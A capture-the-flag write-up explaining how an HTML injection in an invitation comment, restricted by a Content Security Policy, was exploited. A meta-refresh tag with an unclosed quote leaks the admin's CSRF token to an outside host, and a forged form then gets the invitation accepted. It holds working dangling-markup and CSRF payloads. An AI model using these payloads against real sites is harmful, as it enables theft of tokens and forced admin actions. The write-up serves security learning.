# A world without JS (400 points)

This challenge is a system for asking an invitation to an event. We're able to create an account and to ask the organizer to be invited to an event, with a comment.
We fastly saw that the comment is vulnerable to an XSS; however, the Content Security Policy is blocking pretty much everything, and we're not able to include some javascript to trap the admin easily.

Here is the templating in charge of displaying our invitation demand to the admin : 

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/css/bulma.min.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <title>ARaaS - Administration</title>
</head>
<body>
    {{> navbar }}
    <section class="section">
        <div class="container">
            <h1 class="title">
                Process invitation #{{ invitation.getId }}
            </h1>
            <hr>
            <div class="content">
                <p>{{{ invitation.getComment }}}</p>
                <!-- "` --><!-- </textarea> --></form></option><form action="/admin.php" method="post">
                    <input type="hidden" name="{{ anticsrf.getTokenName }}" value="{{ anticsrf.getToken }}">
                    <input type="hidden" name="id" value="{{ invitation.getId }}">
                    <div class="control">
                        <label class="radio">
                            <input type="radio" name="status" value="1">
                            Accept
                        </label>
                        <label class="radio">
                            <input type="radio" name="status" value="-1" checked>
                            Reject
                        </label>
                    </div>
                    <div class="field">
                        <p class="control">
                            <button class='button is-success' type='submit' id='submit'>
                                Process
                            </button>
                        </p>
                    </div>
                </form>
            </div>
        </div>
    </section>
</body>
</html>
```

What we control, and where we can inject HTML, is the *{{{ invitation.getComment }}}* part. The goal is to force the admin to accept our invitation.

Three things is to note :
* The form is protected with a CSRF token; the code indicates that it's valid for 1028 requests :);
* A line was added to prevent us from adding another <form> or to wrap everything in a <textarea>, a HTML comment or even a backtick and a double quote.
* However, it doesn't prevent the injection of a single quote to capture most of the form.

My first idea was to play with <base> to redirect the form on another page, and eventually exfiltrate the form data, but found nothing interesting. Instead, I tried to exfiltrate the content of the page, using the ' tricks.

What came in my mind is the <meta> tag that permits to redirect any user to a controlled website. By injecting a <meta> tag with an url attribute beginning by a single quote, we can exfiltrate all of the form to another website.

The following payload
```html
<META http-equiv="refresh" content="0; URL='http://blakl.is/?
```

will result in the following tag rendered to the administrator
```html
<META http-equiv="refresh" content="0; URL='http://blakl.is/?</p>
                <!-- "` --><!-- </textarea> --></form></option><form action="/admin.php" method="post">
                    <input type="hidden" name="csrf-token" value="ADMINTOKEN">
                    <input type="hidden" name="id" value="INVITATIONI">
                    <div class="control">
                        <label class="radio">
                            <input type="radio" name="status" value="1">
                            Accept
                        </label>
                        <label class="radio">
                            <input type="radio" name="status" value="-1" checked>
                            Reject
                        </label>
                    </div>
                    <div class="field">
                        <p class="control">
                            <button class=' [...]>
```

Consequently, the CSRF token will be leaked to http://blakl.is/ when the administrator will be redirected. By retrieving it, we can simply craft a new form to phish the admin.

The final payload is the following : 

```html
<form action="/admin.php" method="post">
	<input type="hidden" name="csrf-token" value="LEAKEDCSRFTOKEN">
	<input type="hidden" name="id" value="INVITATIONID">
	<input type="text" name="status" value="1">
	<div class="field">
		<p class="control">
			<button class='button is-success' type='submit' id='submit'>
				Process
			</button>
		</p>
	</div>
</form><p bla='
```

The administrator will click on the submit button, and tada! The invitation is accepted, and the flag is displayed.

Do not hesitate to ask for explanations if necessary, dm me on twitter @Blaklis_ !

*Blaklis from sec0d*




